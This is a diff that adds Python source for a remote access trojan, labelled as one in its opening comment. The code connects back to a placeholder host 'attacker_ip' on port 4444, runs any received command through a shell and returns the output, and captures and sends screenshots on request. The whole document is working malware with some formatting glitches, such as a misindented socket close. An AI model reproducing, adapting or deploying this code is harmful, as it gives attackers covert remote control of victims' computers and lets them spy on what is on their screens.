@@ -1,0 +1,74 @@
+// This RAT allows remote command execution and can take screenshots of
+the infected system. In a real-world scenario, a RAT would likely have
+many more features, such as keylogging, file transfer, and webcam access.
+
+
+import socket
+
+import subprocess
+
+import os
+
+import pyautogui
+class RAT:
+
+    def __init__(self, host, port):
+
+        self.host = host
+
+        self.port = port
+
+        self.socket = socket.socket(socket.AF_INET,
+
+socket.SOCK_STREAM)
+
+        
+
+    def connect(self):
+
+        self.socket.connect((self.host, self.port))
+
+        
+
+    def execute_command(self, command):
+
+        return subprocess.check_output(command, shell=True)
+
+    
+
+    def take_screenshot(self):
+
+        screenshot = pyautogui.screenshot()
+
+        screenshot.save("screenshot.png")
+
+        return open("screenshot.png", "rb").read()
+
+    
+
+    def run(self):
+
+        while True:
+
+            command = self.socket.recv(1024).decode()
+
+            if command.lower() == "exit":
+
+                break
+
+            elif command.lower() == "screenshot":
+
+                self.socket.send(self.take_screenshot())
+
+            else:
+
+                output = self.execute_command(command)
+
+                self.socket.send(output)
+self.socket.close()
+
+rat = RAT("attacker_ip", 4444)
+
+rat.connect()
+
+rat.run()
